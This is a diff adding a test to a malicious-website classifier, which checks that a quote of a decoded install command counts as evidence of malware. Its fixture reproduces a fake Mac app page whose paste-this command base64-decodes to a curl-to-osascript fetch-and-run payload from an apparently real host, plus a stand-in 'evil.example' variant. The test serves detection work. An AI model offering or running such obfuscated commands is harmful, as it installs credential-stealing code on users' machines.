@@ -524,6 +524,31 @@ test("an invented-brand app site with a pasted stealer command is reported as ma
 	expect(finding.evidenceQuote).toBe(paneoInstallCommand);
 });
 
+test("a quote of what a shown command decodes to is corroborated by the local decoding, and kept as the command the page shows", () => {
+	// Production case 380697679325302795: macmorrow.app's install dialog, as the Mac capture
+	// read it; the classifier quoted the decoded payload and the finding was dropped.
+	const shownCommand = `echo "https://apps.apple.com/app/macmorrow-install"; echo 'Y3VybCAtc2ZMIGh0dHBzOi8va2V5Y2hhaW5hZ2VudC5wcm8vd2tzeGdqL3lYMWZRV0ZHdzlycCB8IG9zYXNjcmlwdCAtbCBKYXZhU2NyaXB0' | base64 -d | zsh`;
+	const macmorrow = capturedPage(
+		"https://macmorrow.app/",
+		["MacMorrow · Installation", "Install MacMorrow on your Mac.", "1", "Open Terminal", "Press ⌘ + Space, typeTerminal and press Return.", "2", "Copy the Mac command", `${shownCommand}Copy`, "✓ macOS 14+ · Apple Silicon (M1–M4) & Intel · One command · Copy & paste"].join("\n"),
+		"<html><body><button>Download for Mac</button></body></html>",
+	);
+	const [command] = extractPasteCommands(macmorrow.archive.text.toString("utf-8"));
+	expect(command?.layers[1]?.text).toBe("curl -sfL https://keychainagent.pro/wksxgj/yX1fQWFGw9rp | osascript -l JavaScript");
+
+	for (const quote of ["curl -sfL https://keychainagent.pro/wksxgj/yX1fQWFGw9rp | osascript -l JavaScript", "https://keychainagent.pro/wksxgj/yX1fQWFGw9rp |  osascript"]) {
+		expect(classify(macmorrow, { finding: "malware", phishingBasis: "none", evidenceQuote: quote })).toEqual({ finding: "malware", evidenceQuote: command!.shown });
+	}
+	// The page text itself still verifies as before.
+	expect(classify(macmorrow, { finding: "malware", phishingBasis: "none", evidenceQuote: "Copy the Mac command" })).toEqual({ finding: "malware", evidenceQuote: "Copy the Mac command" });
+	expect(command!.shown).toBe(shownCommand);
+	expect(classify(macmorrow, { finding: "malware", phishingBasis: "none", evidenceQuote: "osascript" })).toMatchObject({ finding: "insufficient_evidence" });
+	// A payload no shown command decodes to stays invented.
+	expect(classify(macmorrow, { finding: "malware", phishingBasis: "none", evidenceQuote: "curl -sfL https://evil.example/x | osascript" })).toMatchObject({ finding: "insufficient_evidence" });
+	// Decoded layers corroborate malware only, never phishing.
+	expect(classify(macmorrow, { finding: "phishing", phishingBasis: "credential_theft", evidenceQuote: "curl -sfL https://keychainagent.pro/wksxgj/yX1fQWFGw9rp | osascript -l JavaScript" })).toMatchObject({ finding: "insufficient_evidence" });
+});
+
 test("a malware claim needs a verbatim quote and phishing never carries a malware basis", () => {
 	expect(classify(paneo, { finding: "malware", phishingBasis: "none", evidenceQuote: "Run this to get infected" })).toEqual({
 		finding: "insufficient_evidence",
